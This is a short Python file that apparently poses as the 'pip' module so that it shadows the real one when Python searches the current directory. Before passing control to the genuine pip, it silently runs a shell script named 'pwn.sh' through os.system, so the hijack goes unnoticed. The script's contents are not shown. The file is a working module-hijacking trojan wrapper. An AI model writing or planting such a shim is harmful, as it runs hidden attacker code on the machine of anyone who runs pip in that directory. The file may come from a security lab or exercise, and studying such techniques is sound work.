import os
import sys
import runpy

os.system("bash pwn.sh")

# Remove the current directory from sys.path to find the real pip
sys.path.pop(0)
runpy.run_module("pip", run_name="__main__")
